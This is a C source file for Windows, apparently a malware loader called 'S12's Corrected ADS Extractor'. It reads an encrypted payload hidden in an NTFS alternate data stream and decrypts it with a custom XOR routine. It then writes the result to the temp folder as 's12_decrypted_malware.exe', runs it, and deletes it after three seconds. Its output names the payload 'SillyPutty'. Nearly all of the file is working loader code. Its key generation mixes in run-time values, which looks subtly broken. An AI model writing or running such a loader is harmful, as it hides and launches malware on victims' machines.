#include <windows.h>
#include <stdio.h>

#define ADS_NAME ":s12data"

// CORRECTED S12's Decryption - Fixed Algorithm
void S12_AdvancedXOR_Decrypt(PBYTE data, DWORD size, PBYTE key, DWORD keySize) {
    DWORD keyIndex = 0;
    BYTE evolvedKey[256];
    
    // Initialize evolved key (same as encryption)
    for (DWORD i = 0; i < 256; i++) {
        evolvedKey[i] = key[i % keySize] ^ (BYTE)i;
    }
    
    // IMPORTANT: XOR is symmetric, so we use the SAME process as encryption
    // We need to simulate the exact same key evolution
    for (DWORD pass = 0; pass < 3; pass++) {
        BYTE tempData[size];  // Store original data for key evolution
        memcpy(tempData, data, size);
        
        for (DWORD i = 0; i < size; i++) {
            // Store original byte before decryption
            BYTE originalByte = data[i];
            
            // Apply reverse XOR operations
            data[i] ^= evolvedKey[keyIndex % 256];
            data[i] ^= (BYTE)(i & 0xFF);
            data[i] ^= (BYTE)((i >> 8) & 0xFF);
            data[i] ^= (BYTE)pass;
            
            // Evolve key using the ORIGINAL encrypted byte (before decryption)
            evolvedKey[keyIndex % 256] += originalByte + i + pass;
            evolvedKey[keyIndex % 256] = ((evolvedKey[keyIndex % 256] << 1) | 
                                         (evolvedKey[keyIndex % 256] >> 7));
            
            keyIndex = (keyIndex + 1) % 256;
        }
        
        keyIndex = (keyIndex * 17 + 42) % 256;
    }
}

// S12's Key Generation (identical to encryption)
void S12_GenerateObfuscatedKey(PBYTE key, DWORD keySize, const char* seed) {
    DWORD seedHash = 0x811C9DC5;
    
    for (int i = 0; seed[i]; i++) {
        seedHash ^= seed[i];
        seedHash *= 0x01000193;
    }
    
    DWORD entropy1 = GetTickCount();
    DWORD entropy2 = GetCurrentProcessId();
    DWORD entropy3 = (DWORD)GetCurrentThreadId();
    
    for (DWORD i = 0; i < keySize; i++) {
        key[i] = (BYTE)((seedHash >> (i % 4) * 8) ^ 
                       (entropy1 >> (i % 4) * 8) ^
                       (entropy2 >> (i % 4) * 8) ^
                       (entropy3 >> (i % 4) * 8) ^
                       (i * 37));
        
        seedHash = ((seedHash << 5) + seedHash) + i;
    }
}

// Simple test to verify decryption
BOOL VerifyPEFile(PBYTE data, DWORD size) {
    if (size < 64) return FALSE;
    
    // Check DOS header
    if (data[0] != 'M' || data[1] != 'Z') {
        printf("❌ Invalid DOS header (got %02X %02X, expected 4D 5A)\n", data[0], data[1]);
        return FALSE;
    }
    
    // Check PE offset
    DWORD peOffset = *(DWORD*)(data + 60);
    if (peOffset >= size - 4) {
        printf("❌ Invalid PE offset: %lu\n", peOffset);
        return FALSE;
    }
    
    // Check PE signature
    if (data[peOffset] != 'P' || data[peOffset + 1] != 'E') {
        printf("❌ Invalid PE signature at offset %lu\n", peOffset);
        return FALSE;
    }
    
    printf("✅ Valid PE file structure detected\n");
    return TRUE;
}

// Corrected extraction with better error handling
BOOL S12_ExtractAndExecute(const char* hostFile, const char* keySeed) {
    printf("S12's CORRECTED ADS Extractor v2.0\n");
    printf("===================================\n");
    printf("Host file: %s\n", hostFile);
    printf("Key seed: %s\n\n", keySeed);
    
    // Build ADS path
    char adsPath[MAX_PATH];
    snprintf(adsPath, sizeof(adsPath), "%s%s", hostFile, ADS_NAME);
    
    // Open ADS
    HANDLE hADS = CreateFileA(adsPath, GENERIC_READ, FILE_SHARE_READ, NULL,
                             OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hADS == INVALID_HANDLE_VALUE) {
        printf("❌ Cannot access ADS: %s (Error: %lu)\n", adsPath, GetLastError());
        return FALSE;
    }
    
    DWORD payloadSize = GetFileSize(hADS, NULL);
    printf("📦 Hidden payload size: %lu bytes\n", payloadSize);
    
    // Read payload
    PBYTE encryptedPayload = (PBYTE)HeapAlloc(GetProcessHeap(), 0, payloadSize);
    DWORD bytesRead;
    ReadFile(hADS, encryptedPayload, payloadSize, &bytesRead, NULL);
    CloseHandle(hADS);
    
    printf("📥 Encrypted payload read: %lu bytes\n", bytesRead);
    
    // Generate key
    BYTE decryptionKey[64];
    S12_GenerateObfuscatedKey(decryptionKey, sizeof(decryptionKey), keySeed);
    printf("🔑 Decryption key generated\n");
    
    // Show first few bytes before decryption
    printf("🔐 First 16 encrypted bytes: ");
    for (int i = 0; i < 16; i++) {
        printf("%02X ", encryptedPayload[i]);
    }
    printf("\n");
    
    // Decrypt
    printf("🔓 Decrypting with corrected S12 algorithm...\n");
    S12_AdvancedXOR_Decrypt(encryptedPayload, payloadSize, decryptionKey, sizeof(decryptionKey));
    
    // Show first few bytes after decryption
    printf("📝 First 16 decrypted bytes: ");
    for (int i = 0; i < 16; i++) {
        printf("%02X ", encryptedPayload[i]);
    }
    printf("\n");
    
    // Verify it's a valid PE
    if (!VerifyPEFile(encryptedPayload, payloadSize)) {
        printf("❌ Decryption failed - invalid PE file\n");
        printf("💡 This means the decryption algorithm needs adjustment\n");
        
        // Save for analysis anyway
        char debugFile[MAX_PATH];
        GetTempPathA(MAX_PATH, debugFile);
        strcat(debugFile, "\\debug_decrypted.bin");
        
        HANDLE hDebug = CreateFileA(debugFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hDebug != INVALID_HANDLE_VALUE) {
            DWORD written;
            WriteFile(hDebug, encryptedPayload, payloadSize, &written, NULL);
            CloseHandle(hDebug);
            printf("💾 Debug file saved: %s\n", debugFile);
        }
        
        HeapFree(GetProcessHeap(), 0, encryptedPayload);
        return FALSE;
    }
    
    // Save decrypted file
    char tempFile[MAX_PATH];
    GetTempPathA(MAX_PATH, tempFile);
    strcat(tempFile, "\\s12_decrypted_malware.exe");
    
    HANDLE hTemp = CreateFileA(tempFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hTemp == INVALID_HANDLE_VALUE) {
        printf("❌ Cannot create temp file\n");
        HeapFree(GetProcessHeap(), 0, encryptedPayload);
        return FALSE;
    }
    
    DWORD bytesWritten;
    WriteFile(hTemp, encryptedPayload, payloadSize, &bytesWritten, NULL);
    CloseHandle(hTemp);
    
    printf("💾 Decrypted file saved: %s (%lu bytes)\n", tempFile, bytesWritten);
    
    // Try to execute
    printf("🚀 Attempting execution...\n");
    
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    
    if (CreateProcessA(tempFile, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        printf("✅ SillyPutty executed successfully! PID: %lu\n", pi.dwProcessId);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        
        // Cleanup after delay
        Sleep(3000);
        DeleteFileA(tempFile);
        
    } else {
        DWORD error = GetLastError();
        printf("❌ Execution failed (Error: %lu)\n", error);
        printf("💡 File saved for manual analysis: %s\n", tempFile);
        // Don't delete - keep for analysis
    }
    
    HeapFree(GetProcessHeap(), 0, encryptedPayload);
    return TRUE;
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        printf("S12's Corrected ADS Extractor v2.0\n");
        printf("===================================\n");
        printf("Usage: %s <host_file> <key_seed>\n", argv[0]);
        return 1;
    }
    
    S12_ExtractAndExecute(argv[1], argv[2]);
    return 0;
}
